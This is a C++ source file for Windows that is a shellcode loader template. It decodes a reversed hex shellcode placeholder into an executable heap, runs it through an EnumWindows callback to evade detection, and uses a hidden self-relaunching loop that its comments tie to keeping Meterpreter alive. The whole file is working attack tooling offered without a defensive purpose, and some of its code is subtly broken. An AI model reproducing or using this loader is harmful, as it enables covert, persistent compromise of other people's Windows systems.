#pragma comment(linker,"/subsystem:\"windows\"  /entry:\"mainCRTStartup\"" )
#define _CRT_SECURE_NO_DEPRECATE
#include <string.h>
#include <windows.h>
#include <stdio.h>


void FormatCode(char* array, char* buf) {
	_strrev(array);
	while (*array) {
		if (' ' == *array) {
			array++;
			continue;
		}
		sscanf(array, "%02X", buf);
		array += 2;
		buf++;
	}
}


void hardCode() {
	char array[] = "{{SHELLCODE_STR}}";

	unsigned int memory_allocation = strlen(array) / 2;

	char* buf = (char*)malloc(memory_allocation);

	memset(buf, 0, memory_allocation);

	FormatCode(array, buf);

	//heap
	LPVOID heapp = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
	LPVOID ptr = HeapAlloc(heapp, 0, sizeof(buf));

	RtlMoveMemory(ptr, buf, memory_allocation);

	//callback
	::EnumWindows((WNDENUMPROC)ptr, NULL);
}



//
// Call self without parameter to start
//

BOOL SCall() {
	char path[MAX_PATH];
	char cmd[MAX_PATH];

	if (GetModuleFileName(NULL, path, sizeof(path)) == 0) {
		// Get module file name failed
		return FALSE;
	}
	STARTUPINFO startup_info;
	PROCESS_INFORMATION process_information;

	ZeroMemory(&startup_info, sizeof(startup_info));
	startup_info.cb = sizeof(startup_info);

	ZeroMemory(&process_information, sizeof(process_information));

	// If create process failed.
	// CREATE_NO_WINDOW = 0x08000000
	printf(path);
	if (CreateProcess(path, path, NULL, NULL, TRUE, 0x08000000, NULL,
		NULL, &startup_info, &process_information) == 0) {
		printf("Create process failed");
		return FALSE;
	}

	// Wait until the process died.
	WaitForSingleObject(process_information.hProcess, -1);
	return TRUE;
}


//
// Call self with parameter guard to start meterpreter
//

void GCall() {
	char path[MAX_PATH];
	char cmd[MAX_PATH];
	cmd[0] = '\0';
	strcat(cmd, path);
	strcat(cmd, " g");
	if (GetModuleFileName(NULL, path, sizeof(path)) == 0) {
		// Get module file name failed
		return;
	}

	STARTUPINFO startup_info;
	PROCESS_INFORMATION process_information;

	ZeroMemory(&startup_info, sizeof(startup_info));
	startup_info.cb = sizeof(startup_info);

	ZeroMemory(&process_information, sizeof(process_information));

	// If create process failed.
	// CREATE_NO_WINDOW = 0x08000000
	if (CreateProcess(path, cmd, NULL, NULL, TRUE, 0x08000000, NULL,
		NULL, &startup_info, &process_information) == 0) {
		return;
	}

	// Wait until the process died.
	WaitForSingleObject(process_information.hProcess, -1);
}


//
// Main function
//

int main() {

	LPTSTR cmdline;
	cmdline = GetCommandLine();

	char* argv[MAX_PATH];
	char* ch = strtok(cmdline, " ");
	int argc = 0;
	BOOL returnflag = FALSE;
	while (ch != NULL) {
		argv[argc] = (char*)malloc(strlen(ch) + 1);
		strncpy(argv[argc], ch, strlen(ch) + 1);
		ch = strtok(NULL, " ");
		argc++;
	}

	if (argc > 1) {
		if (strcmp(argv[argc - 1], "g") == 0) {
			// Starts the loop
			while (TRUE) {
				returnflag = SCall();
				if (returnflag == FALSE) {
					printf("Create process failed");
					return 0;
				}
				Sleep(10000);
			}
			return 0;
		}
	}
	// Starts the Meterpreter as a normal application
	hardCode();
	return 0;
}